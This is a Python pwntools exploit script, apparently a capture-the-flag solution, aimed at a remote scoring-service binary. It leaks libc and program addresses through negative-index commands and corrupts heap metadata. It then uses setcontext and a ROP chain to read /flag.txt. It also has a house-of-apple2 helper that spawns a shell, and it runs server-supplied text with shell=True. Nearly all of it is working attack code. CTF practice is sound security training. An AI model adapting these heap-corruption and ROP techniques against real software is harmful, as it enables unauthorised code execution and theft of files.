#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import os
from pwncli import IO_FILE_plus_struct
from keystone import *
from capstone import *

bin_path = "./lmk_patched"
if args.EXE or bin_path:
    exe = context.binary = ELF(args.EXE or bin_path)
else:
    exe = None

# context.terminal = "wt.exe wsl".split()
context.terminal = "cmd.exe /c start wt.exe -w 0 split-pane wsl.exe bash -c".split()
context.log_level = "debug" if args.DEBUG else "info"


libc_path = "./libc.so.6"
ld_path = "./ld-linux-x86-64.so.2"
libc = ELF(libc_path) if libc_path else (exe.libc if exe else None)
ld = ELF(ld_path) if ld_path else None


class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            error(f'"{name}" doesn\'t exist')
            return lambda: ...

        if hasattr(resolved, "address"):
            resolved = getattr(resolved, "address")

            if not resolved & 0xFFF:
                success(term.text.bold_green(f"{name}.address & 0xFFF == 0"))
            else:
                warn(term.text.bold_yellow(f"{name}.address & 0xFFF != 0"))

        info(term.text.blue(f"{name} : {resolved:#x}"))
        return lambda: ...


logx = LogAddressHex()


def debugger_args():
    if args.GEF:
        gef_path = os.path.expanduser(
            os.environ.get("GEF_PATH", "~/.local/share/gef/gef.py")
        )
        return ["-nx", "-ex", f"source {gef_path}"]
    return None


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    kw["env"] = {"SHELL": "/bin/sh"}
    if args.GDB or args.GEF:
        return gdb.debug(
            [exe.path] + argv, gdbscript=gdbscript, gdb_args=debugger_args(), *a, **kw
        )
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB or args.GEF:
        gdb.attach(io, gdbscript=gdbscript, gdb_args=debugger_args())
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def fasm(code, pp=True):
    ks = Ks(KS_ARCH_X86, KS_MODE_64 if context.arch == "amd64" else KS_MODE_32)
    if pp:
        code = cpp(code)
    encoding, _ = ks.asm(code)
    return bytes(encoding)


def fdisasm(code, vma=0x0):
    md = Cs(CS_ARCH_X86, CS_MODE_64 if context.arch == "amd64" else CS_MODE_32)
    instructions = []
    for i in md.disasm(code, vma):
        instructions.append("0x{:x}:\t{}\t{}".format(i.address, i.mnemonic, i.op_str))
    return "\n".join(instructions)


def ua(x):
    return int.from_bytes(x, "little")


def se(x):
    return str(x).encode()


def cyc(x):
    n = 8 if context.arch == "amd64" else 4
    return cyclic(x, n=n)


def solve_pow(crib=b"pwn.red"):
    if args.LOCAL:
        return
    with log.progress("Solving PoW..."):
        cmd = p.recvline_contains(crib).decode().strip()
        output = subprocess.check_output(cmd, shell=True)
        p.sendline(output)


def hoa(libc=libc, func=None, arg="sh", IO_target=None):
    func = libc.sym.system if func is None else func
    IO_target = libc.sym["_IO_2_1_stderr_"] if IO_target is None else IO_target
    return IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(
        IO_target,
        libc.sym["_IO_wfile_jumps"],
        func,
        arg,
    )


def s(*k, **a):
    p.send(*k, **a)


def sl(*k, **a):
    p.sendline(*k, **a)


def sa(*k, **a):
    p.sendafter(*k, **a)


def sla(*k, **a):
    p.sendlineafter(*k, **a)


def r(*k, **a):
    return p.recv(*k, **a)


def ru(*k, **a):
    return p.recvuntil(*k, **a)


def rl(*k, **a):
    return p.recvline(*k, **a)


def rlc(*k, **a):
    return p.recvline_contains(*k, **a)


def rlse(x=None):
    if x is None:
        return eval(p.recvline().split()[-1])
    return p.recvline_contains(x).split()[-1]


gdbscript = """
b *(main+0)
continue
""".format(**locals())


if args.LOCAL:
    host, port = "localhost", 9000
else:
    ip = sys.argv[1]
    host, port = ip, 24000


p = start_remote()
sl(b"SCORE -11")
ru(b"-11: ")
libc.address = rlse() - libc.sym.fork
logx.libc

sl(b"SCORE -1")
ru(b"-1: ")
exe.address = rlse() - exe.sym.op_score
logx.exe


sl(b"SUBMIT")

sl(b"ALICE 100 0 0 64")
s(b"/flag.txt\0".ljust(64))
sl(b"ATTACH 0 64")
s(b"Z" * 64)


sl(b"SUBMIT")

sl(b"YUDA 100 0 0 64")
s(b"A" * 64)
sl(b"ATTACH 1 64")
s(b"Z" * 64)

sl(b"SUBMIT")

sl(b"ADAM 100 0 0 1024")
s(b"A" * 1024)
sl(b"ATTACH 2 1024")
s(b"b" * 1024)

sl(b"ATTACH -1 1024")
sl(b"c" * 1024)

sl(b"RETRACT 1")
sl(b"VIEW 0")

ru(b"appendix:\n")
test = bytearray(r(64 + 32))
leak_heap = ua(test[0x50:0x58])

logx.leak_heap
print(hexdump(test))

sl(b"RETRACT 2")
sl(b"RETRACT -1")
sl(b"ATTACH -1 8")


from setcontext32 import setcontext32

flag_txt = exe.address + 0x6508
rop_chain = leak_heap * 0x1000 + 0xD60
logx.rop_chain
dest, payload = setcontext32(
    libc,
    rip=libc.sym["open"],
    rdi=flag_txt,
    rsi=0,
    rdx=0x100,
    rsp=rop_chain,
)


test = p64(dest ^ leak_heap)
logx.dest
s(test)

sl(b"SUBMIT")

rop = ROP(libc)
rop.read(3, exe.bss(+0x100), 0x100)
rop.write(1, exe.bss(+0x100), 0x100)


# ROP CHAIN
sl(b"ROPCHAIN 100 0 0 1024")
s(b"A" * 1024)
sl(b"ATTACH 1 1024")
s(rop.chain().ljust(1024))


sl(b"SUBMIT")

sl(b"TRASH 100 0 0 1024")
s(b"A" * 1024)
sl(b"ATTACH 2 1024")
print(hexdump(payload))


s(payload[:1024])


print(len(payload))

print(p.recvall().decode(), flush=True)


p.interactive()
